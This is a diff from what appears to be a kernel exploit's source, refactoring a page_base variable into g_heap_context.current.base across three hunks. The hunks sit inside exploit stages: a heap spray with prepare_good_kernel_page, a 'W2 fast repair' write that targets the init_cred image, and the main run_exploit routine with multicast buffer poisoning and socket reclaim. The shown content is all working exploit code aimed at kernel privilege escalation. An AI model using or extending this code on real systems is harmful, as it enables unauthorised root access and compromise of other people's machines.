@@ -625,8 +625,8 @@ static int do_one_write(const WriteRequest *request, const char *desc) {
         return ok;
     }
     TIMER("  heap spray start");
-    page_base = prepare_good_kernel_page(request);
-    if (!page_base) {
+    (g_heap_context.current.base) = prepare_good_kernel_page(request);
+    if (!(g_heap_context.current.base)) {
         pr_warning("  heap spray failed\n");
         return 0;
     }
@@ -1215,8 +1215,8 @@ static int retry_write_stage(
                             resolved_addresses_init_cred_image(
                                 &g_resolved_addresses)) + 8,
                     WriteMode::Zero, 1);
-            page_base = prepare_good_kernel_page(&repair_request);
-            if (!page_base || !stash_prebuilt_page()) {
+            (g_heap_context.current.base) = prepare_good_kernel_page(&repair_request);
+            if (!(g_heap_context.current.base) || !stash_prebuilt_page()) {
                 pr_warning("W2 fast repair prebuild failed\n");
                 discard_prebuilt_page();
                 return 0;
@@ -1437,7 +1437,7 @@ int run_exploit(int argc, char **argv) {
         if (kernel5_route_selected() &&
                 !runtime_config_snapshot().multicast_resident_enabled) {
             uintptr_t w1_scratch_poison =
-                    page_base + PROFILE_VALUES->mcast_buffer_size;
+                    (g_heap_context.current.base) + PROFILE_VALUES->mcast_buffer_size;
             if (!quarantine_reclaim_sockets()) {
                 pr_warning("W1 scratch page quarantine failed\n");
                 return 1;
